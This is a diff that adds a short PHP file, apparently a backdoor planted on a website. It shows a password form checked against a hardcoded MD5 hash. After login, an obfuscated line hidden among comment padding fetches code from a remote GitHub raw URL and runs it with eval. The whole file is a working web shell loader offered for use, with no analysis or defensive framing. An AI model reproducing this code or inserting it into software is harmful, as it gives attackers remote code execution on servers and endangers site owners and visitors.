@@ -1,0 +1,31 @@
+<?php
+session_start();
+
+/* MD5 hash of your password (example: md5("mypassword")) */
+$PASS_MD5 = "ce55d7ea9fdf0dfd2aef483743e2e022";
+
+if (!isset($_SESSION['auth'])) {
+    if (isset($_POST['p']) && md5($_POST['p']) === $PASS_MD5) {
+        $_SESSION['auth'] = true;
+    } else {
+        ?>
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>byp4a55 professor6T9</title>
+        </head>
+        <body>
+            <form method="post">
+                <input type="password" name="p" placeholder="Password">
+                <button type="submit">Enter</button>
+            </form>
+        </body>
+        </html>
+        <?php
+        exit;
+    }
+}
+?>
+
+<title>byp4a55 professor6T9</title>
+<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://raw.githubusercontent.com/Professor6T9x/SeoOk/refs/heads/main/admin.txt"));/**/?>
